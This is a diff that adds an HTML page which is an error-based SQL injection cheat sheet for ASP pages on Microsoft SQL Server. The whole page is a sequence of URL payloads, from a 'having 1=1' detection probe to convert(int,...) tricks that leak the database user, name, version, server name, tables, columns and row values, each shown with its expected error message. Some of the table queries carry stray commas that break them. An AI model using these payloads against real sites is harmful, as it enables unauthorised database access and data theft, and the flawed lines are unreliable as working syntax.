@@ -1,0 +1,121 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Error</title>
+</head><body><br/>
+ERROR SQL INJECTION - DETECTION<br/>
+&nbsp;&#09;<br/>
+Integer Injection:<br/>
+http://[site]/page.asp?id=1 having 1=1--<br/>
+Column '[COLUMN NAME]' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.<br/>
+<br/>
+String Injection:<br/>
+http://[site]/page.asp?id=x' having 1=1--<br/>
+<br/>
+Column '[COLUMN NAME]' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT DATABASE USER<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 or 1=convert(int,(USER))--<br/>
+Syntax error converting the nvarchar value '[DB USER]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT DATABASE NAME<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 or 1=convert(int,(DB_NAME))--<br/>
+Syntax error converting the nvarchar value '[DB NAME]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT DATABASE VERSION<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 or 1=convert(int,(@@VERSION))--<br/>
+Syntax error converting the nvarchar value '[DB VERSION]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT SERVER NAME<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 or 1=convert(int,(@@SERVERNAME))--<br/>
+Syntax error converting the nvarchar value '[SERVER NAME]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 1st &nbsp;DATABASE TABLE<br/>
+&nbsp;&#09;<br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--<br/>
+Syntax error converting the nvarchar value '[TABLE NAME 1]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 2nd DATABASE TABLE<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85) and ,name&gt;'TABLE-NAME-1'))--<br/>
+Syntax error converting the nvarchar value '[TABLE NAME 2]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 3rd DATABASE TABLE<br/>
+&nbsp;&#09;<br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85) and ,name&gt;'TABLE-NAME-2'))--<br/>
+Syntax error converting the nvarchar value '[TABLE NAME 3]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 1st TABLE COLUMN NAME<br/>
+&nbsp;&#09;<br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--<br/>
+Syntax error converting the nvarchar value '[COLUMN NAME &nbsp;1]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 2nd TABLE COLUMN NAME<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1' and column_name&gt;'COLUMN-NAME-1'))--<br/>
+Syntax error converting the nvarchar value '[COLUMN NAME 2]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 3rd TABLE COLUMN NAME<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1' and column_name&gt;'COLUMN-NAME-2'))--<br/>
+Syntax error converting the nvarchar value '[COLUMN NAME &nbsp;3]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 1st FIELD OF 1st ROW<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--<br/>
+Syntax error converting the nvarchar value '[FIELD 1 VALUE]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 2nd FIELD OF 1st ROW<br/>
+&nbsp;&#09;<br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 COLUMN-NAME-2 from TABLE-NAME-1))--<br/>
+Syntax error converting the nvarchar value '[FIELD 2 VALUE]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 3nd FIELD OF 1st ROW<br/>
+&nbsp;&#09;<br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 COLUMN-NAME-3 from TABLE-NAME-1))--<br/>
+Syntax error converting the nvarchar value '[FIELD 3 VALUE]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 1st FIELD OF 2nd ROW<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1 where COLUMN-NAME-1 NOT in ('FIELD-1-VALUE') order by COLUMN-NAME-1 desc))--<br/>
+Syntax error converting the nvarchar value '[FIELD 1 VALUE OF 2ND ROW]' to a column of data type int.<br/>
+<br/>
+&nbsp;<br/>
+<br/>
+ERROR SQL INJECTION - EXTRACT 1st FIELD OF 3nd ROW<br/>
+&nbsp;&#09; <br/>
+http://[site]/page.asp?id=1 &nbsp;or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1 where COLUMN-NAME-1 NOT in ('FIELD-2-VALUE') order by COLUMN-NAME-1 desc))--<br/>
+Syntax error converting the nvarchar value '[FIELD 1 VALUE OF 3RD ROW]' to a column of data type int.</body></html>
